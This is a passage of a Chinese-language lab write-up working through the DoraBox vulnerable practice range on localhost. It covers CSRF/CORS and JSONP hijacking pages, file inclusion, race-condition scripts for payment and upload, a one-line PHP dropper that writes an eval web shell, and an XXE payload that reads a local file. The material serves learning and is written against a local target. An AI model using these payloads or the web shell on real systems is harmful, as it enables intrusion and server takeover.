class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Ajax<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>Ajax 发送 get 请求<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax</span>(<span class=\"params\"></span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.responseType = <span class=\"string\">&quot;text&quot;</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.open(<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;http://localhost/dorabox/csrf/userinfo.php&#x27;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.onreadystatechange= <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>) </span>&#123; </span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">this</span>.status == <span class=\"number\">200</span>)&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\talert(<span class=\"built_in\">this</span>.responseText);</span></span><br><span class=\"line\"><span class=\"javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"> &#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">  xhr.send();</span></span><br><span class=\"line\"><span class=\"javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">ajax();</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_ky001.png\" alt=\"\">内容：</p>\n</li>\n</ol>\n<h2 id=\"总结-15\"><a class=\"markdownIt-Anchor\" href=\"#总结-15\">#</a> 总结：</h2>\n<pre><code>实话实说，这个就是借鉴网上的，解释一下js代码：\n\n自定义ajax()方法并执行，ajax内创建XMLHttpRequest对象，设置回应内容的类型为text。\n\n然后发送请求到服务器，其中 open(*method*,*url*,*async*)，第三个参数true为异步，异步 JavaScript 和 XML，XMLHttpRequest 对象如果要用于 AJAX 的话，其 open() 方法的 async 参数必须设置为 true。\n\nonreadystatechange：存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。readyState存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。\n</code></pre>\n<ul>\n<li>\n<p>0: 请求未初始化</p>\n</li>\n<li>\n<p>1: 服务器连接已建立</p>\n</li>\n<li>\n<p>2: 请求已接收</p>\n</li>\n<li>\n<p>3: 请求处理中</p>\n</li>\n<li>\n<p>4: 请求已完成，且响应已就绪</p>\n<p>status\t<br>\n200: “OK”，404: 未找到页面</p>\n</li>\n</ul>\n<p>最后响应成功就 alert 返回的数据</p>\n<p>function ajax() {<br>\nvar xhr = new XMLHttpRequest();<br>\nxhr.responseType = “text”;<br>\nxhr.open(‘GET’, ‘<a href=\"http://localhost/dorabox/csrf/userinfo.php\">http://localhost/dorabox/csrf/userinfo.php</a>’, true);<br>\nxhr.onreadystatechange= function(e) {<br>\nif(this.status == 200){<br>\nalert(this.responseText);<br>\n}<br>\n};<br>\nxhr.send();<br>\n}<br>\najax();</p>\n<h1 id=\"jsonp劫持\"><a class=\"markdownIt-Anchor\" href=\"#jsonp劫持\">#</a> JSONP 劫持</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-16\"><a class=\"markdownIt-Anchor\" href=\"#过程-16\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>来一个 csrf 攻击代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>JSONP劫持测试<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><span class=\"javascript\"></span></span><br><span class=\"line\"><span class=\"javascript\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\">result</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"javascript\">        </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            alert(result.address);</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://localhost/dorabox/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_csrf_json002.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-16\"><a class=\"markdownIt-Anchor\" href=\"#总结-16\">#</a> 总结：</h2>\n<p>JSONP (JSON With Padding)，是一种特殊的 CSRF 攻击，目的是获取敏感数据，当 JSON 数据响应给网站时，浏览器立即会调用数组或者对象的构造函数。正是利用这一点，把构造方法替换成恶意代码，在构造方法中添加将 JSON 数据发送给第三方即攻击者的代码。</p>\n<p>没写过，第一次写，写完跨域好像又多懂了一点点（好像真的懂了，但是入职培训里写的有点详细），我写完这些要再多写几道题，来一点画面感。</p>\n<h1 id=\"任意文件包含\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-17\"><a class=\"markdownIt-Anchor\" href=\"#过程-17\">#</a> 过程：</h2>\n<ol>\n<li>直接文件包含，输出<img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-17\"><a class=\"markdownIt-Anchor\" href=\"#总结-17\">#</a> 总结：</h2>\n<p>网上看了很多通关记录，可是大家都是直接包含，如果不是本地靶场，那是怎么知道路径以及文件名的呢？是不是要配合文件上传一起？</p>\n<h1 id=\"任意文件包含-2\"><a class=\"markdownIt-Anchor\" href=\"#任意文件包含-2\">#</a> 任意文件包含</h1>\n<p><img src=\"dorabox_filein002.png\" alt=\"\"></p>\n<h2 id=\"过程-18\"><a class=\"markdownIt-Anchor\" href=\"#过程-18\">#</a> 过程：</h2>\n<ol>\n<li>输入 1，发现限制在当前目录，但是不影响要用的文件，所以也是直接包含就可以了<img src=\"dorabox_filein004.png\" alt=\"\"><img src=\"dorabox_filein003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-18\"><a class=\"markdownIt-Anchor\" href=\"#总结-18\">#</a> 总结：</h2>\n<p>…/ 应该可以突破把</p>\n<h1 id=\"条件竞争-支付\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-支付\">#</a> 条件竞争 - 支付</h1>\n<p>靶场出了点问题，页面报 php 语法错</p>\n<p>但是语法并没有出错，百度了说是 php 版本的问题，但是我基本每个版本都试过且重启了，但是没有解决</p>\n<p>不过反正这个题要写脚本，我也不太会，干脆跟着把 poc 撸了一遍</p>\n<h2 id=\"过程-19\"><a class=\"markdownIt-Anchor\" href=\"#过程-19\">#</a> 过程：</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> queue</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    三个变量</span></span><br><span class=\"line\"><span class=\"string\">    url：要测试的网站地址</span></span><br><span class=\"line\"><span class=\"string\">    threads：线程数</span></span><br><span class=\"line\"><span class=\"string\">    q：调用queue构造方法，对列队大小不设限</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://localhost/dorabox/race_condition/pay.php&quot;</span></span><br><span class=\"line\">threads=<span class=\"number\">25</span></span><br><span class=\"line\">q=queue.Queue()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在列队中加入50个元素,0-49</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">50</span>):</span><br><span class=\"line\">    q.put(i)   </span><br><span class=\"line\"><span class=\"comment\"># 定义post函数，发50个一块钱</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span>():</span> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 当q里面还有元素时,就获取元素，发送一个post请求支付一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> q.empty():</span><br><span class=\"line\">        q.get() </span><br><span class=\"line\">        <span class=\"comment\"># Requests以form表单形式发送post请求，支付输入框name是money嘛</span></span><br><span class=\"line\">        <span class=\"comment\"># data = &#123;&#x27;key1&#x27;:&#x27;value1&#x27;,...&#125;</span></span><br><span class=\"line\">        r = requests.post(url, data = &#123;<span class=\"string\">&#x27;money&#x27;</span> : <span class=\"number\">1</span>&#125;)</span><br><span class=\"line\">        r.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">一个python文件通常有两种使用方法,</span></span><br><span class=\"line\"><span class=\"string\"> 第一是作为脚本直接执行，</span></span><br><span class=\"line\"><span class=\"string\"> 第二是 import 到其他的 python 脚本中被调用（模块重用）执行。</span></span><br><span class=\"line\"><span class=\"string\"> 因此if __name__ == &#x27;main&#x27;: 的作用就是:</span></span><br><span class=\"line\"><span class=\"string\"> 控制这两种情况执行代码的过程，在if __name__ == &#x27;main&#x27;: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 每个python模块（python文件）都包含内置的变量 __name__，当该模块被直接执行的时候，__name__ 等于文件名（包含后缀 .py ）；如果该模块 import 到其他模块中，则该模块的 __name__ 等于模块名称（不包含后缀.py）</span></span><br><span class=\"line\"><span class=\"string\"> 而“__main__” 始终指当前执行模块的名称（包含后缀.py）。进而当模块被直接执行时，__name__ == &#x27;__main__&#x27; 结果为真。</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\"> 那其实就是主函数呗，程序运行入口，不过也有点区别嗷</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 用25个线程，分别发50个一块钱</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads)：</span><br><span class=\"line\">        t = threading.Thread(target=post) <span class=\"comment\"># 目标对象是post函数</span></span><br><span class=\"line\">        t.start() <span class=\"comment\"># 开始执行线程</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"总结-19\"><a class=\"markdownIt-Anchor\" href=\"#总结-19\">#</a> 总结：</h2>\n<p>python 代码写的时候，总是爱打分号唉<br>\n感觉大家写脚本或者一些小工具，都喜欢用 python，有点意思</p>\n<p>这里是看代码的时候找资料看见的（后来才发现 python 自带.chw api，不过英文的阅读起来也有点费时间就是了）：</p>\n<ul>\n<li>\n<p>Queue 是 python 标准库中的线程安全的列队 (FIFO) 实现<br>\n提供了一个适用于多线程编程的先进先出的数据结构，即列队<br>\n用来在生产者和消费者线程之间的信息传递</p>\n</li>\n<li>\n<p>class Queue.Queue(maxsize=0)<br>\n maxsize 是个整数，指明了列队中能存放的个数上限。<br>\n一旦达到上限，插入会导致阻塞，直到列队中的数据被消费掉。<br>\n如果 maxsize 小于或者等于 0，列队大小没有限制</p>\n</li>\n<li>\n<p>Queue,deque,queue 对比：queue 是多线程中的使用的栈，但是 Python 解释器有一个全局解释器锁 (PIL)，<br>\n导致每个 Python 进程中最多同时运行一个线程，<br>\n因此 Python 多线程程序并不能改善程序性能，不能发挥多核系统的优势。</p>\n</li>\n<li>\n<p>multiprocessing.Queue 是 Python 2.6 引入的用来实现多进程的一种高性能栈。</p>\n</li>\n<li>\n<p>collections.deque 是为了高效实现插入和删除操作的双向列表，适合用于队列和栈。</p>\n</li>\n<li>\n<p>queue 实例方法：<br>\nQueue.empty (): 判断队列是否为空。和上面一样注意<br>\n Queue.full (): 判断是否满了。和上面一样注意<br>\n Queue.put (item, block=True, timeout=None): 往队列里放数据。如果满了的话，blocking = False 直接报 Full 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能存入，报 Full 异常。<br>\nQueue.put_nowait (item): 往队列里存放元素，不等待<br>\n Queue.get (item, block=True, timeout=None): 从队列里取数据。如果为空的话，blocking = False 直接报 empty 异常。如果 blocking = True，就是等一会，timeout 必须为 0 或正数。None 为一直等下去，0 为不等，正数 n 为等待 n 秒还不能读取，报 empty 异常<br>\n Queue.get_nowait (item): 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者 daemon 进程完全消费</p>\n</li>\n</ul>\n<h1 id=\"条件竞争-上传\"><a class=\"markdownIt-Anchor\" href=\"#条件竞争-上传\">#</a> 条件竞争 - 上传</h1>\n<p>看源码顺序：文件上传上来，检查后缀，后缀不在允许列表里，删除文件。</p>\n<p><img src=\"dorabox_jz_upload001.png\" alt=\"\"></p>\n<h2 id=\"过程-20\"><a class=\"markdownIt-Anchor\" href=\"#过程-20\">#</a> 过程：</h2>\n<p>竞争的地方，是先删除还是先执行，关键就在于赶在删除之前执行上传的文件。<br>\n这是我们上传的文件内容，新建一个 info.php 文件，里面写入一句话木马。</p>\n<figure class=\"highlight php\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> fputs(fopen(<span class=\"string\">&quot;info.php&quot;</span>, <span class=\"string\">&quot;w&quot;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过并发可以实现在上传成功未执行到删除代码的时候，访问执行，生成 info.php。</p>\n<p>脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 父类 threading.Thread</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RaceCondition</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        threading.Thread._init_(self)</span><br><span class=\"line\">        self.url = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class=\"comment\"># 马</span></span><br><span class=\"line\">        self.uploadUrl = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class=\"comment\"># 搞它</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 获取上传的马，就是解析执行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_get</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class=\"line\">        r = requests.get(self.url)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>: <span class=\"comment\"># 搞到成功就退出</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;create file info.php success.&#x27;</span>)</span><br><span class=\"line\">            os._exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 传马</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_upload</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;upload file...&#x27;</span>)</span><br><span class=\"line\">        file = &#123;<span class=\"string\">&#x27;myfile&#x27;</span> : <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;attack.php&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)&#125; <span class=\"comment\">#key value的数据，我还以为是啥</span></span><br><span class=\"line\">        requests.post(self.uploadUrl, files=file)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 一直搞</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):  <span class=\"comment\"># 其实就外面那个循环不就好了，为啥还要再写一个for啊</span></span><br><span class=\"line\">                self._upload()</span><br><span class=\"line\">                self._get()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = <span class=\"number\">50</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        t = RaceCondition()</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        <span class=\"comment\"># join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。</span></span><br><span class=\"line\">        t.join() </span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_jz_upload002.png\" alt=\"\"></p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结：</h2>\n<p>python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。</p>\n<p>python 类变量，它的值将在这个类的所有实例之间共享。（还有在_<em>init</em>_() 的时候 self. 变量，这和 java 区别还蛮大的）</p>\n<p>心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。</p>\n<p>最后，这道题真的好帅啊！！！</p>\n<h1 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h1>\n<p>输入…/，发现是可以直接读文件的</p>\n<p><img src=\"dorabox_readanyfile002.png\" alt=\"\"></p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程：</h2>\n<ol>\n<li>直接读取文件<img src=\"dorabox_readanyfile001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结：</h2>\n<p>这个，emmmm，这样的漏洞，很难找把？（傻喵）</p>\n<h1 id=\"xxe\"><a class=\"markdownIt-Anchor\" href=\"#xxe\">#</a> xxe</h1>\n<p>靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）</p>\n<p><img src=\"dorabox_xxe001.png\" alt=\"\"></p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果</p>\n<p><img src=\"dorabox_xxe002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>构造 xml 文件读取 attack.php</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">Sakura</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY a <span class=\"meta-keyword\">SYSTEM</span>  <span class=\"meta-string\">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;a;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>桜桜私はあなたを愛しています<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结：</h2>\n<p>xxe 就是外部实体注入嘛，可以一行代码禁用。</p>\n<p>xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。</p>\n<p>1、 当引用的 DTD 文件是<strong>本地文件</strong>的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>2、 如果引用的 DTD 文件是一个<strong>公共文件</strong>时，采用 PUBLIC 标识，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1. 内部实体声明</strong></p>\n<!ENTITY 实体名称 \"实体的值\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>2. 外部实体声明</strong></p>\n<!ENTITY 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 